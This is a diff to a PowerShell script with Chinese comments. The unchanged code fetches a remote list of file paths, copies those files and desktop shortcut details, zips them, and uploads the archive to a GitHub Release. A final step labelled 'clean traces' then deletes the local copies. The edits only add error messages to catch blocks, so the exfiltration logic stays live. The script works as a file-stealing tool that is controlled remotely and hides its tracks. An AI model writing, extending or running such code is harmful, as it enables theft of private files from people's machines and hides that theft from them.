@@ -34,7 +34,8 @@ try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 } catch {
-    return
+    Write-Output "❌ 无法加载路径列表。"
+    $pathList = @()
 }
 
 $index = 0
@@ -55,7 +56,9 @@ foreach ($path in $pathList) {
         } else {
             Copy-Item $path -Destination $dest -Force -ErrorAction Stop
         }
-    } catch {}
+    } catch {
+        Write-Output "⚠️ 拷贝失败：$path"
+    }
 }
 
 # STEP 2: 提取桌面快捷方式信息
@@ -78,13 +81,16 @@ try {
 
     $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
-} catch {}
+} catch {
+    Write-Output "⚠️ 快捷方式提取失败"
+}
 
 # STEP 3: 压缩归档
 try {
     Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
-    return
+    Write-Output "❌ 压缩失败，终止上传。"
+    exit
 }
 
 # STEP 4: 上传到 GitHub Releases
@@ -106,7 +112,8 @@ try {
     $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
 } catch {
-    return
+    Write-Output "❌ 创建 Release 失败"
+    exit
 }
 
 try {
@@ -117,8 +124,12 @@ try {
         "User-Agent" = "PowerShellScript"
     }
     $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
-} catch {}
+} catch {
+    Write-Output "❌ 上传文件失败"
+}
 
 # STEP 5: 清理痕迹
-Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+try {
+    Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+} catch {}
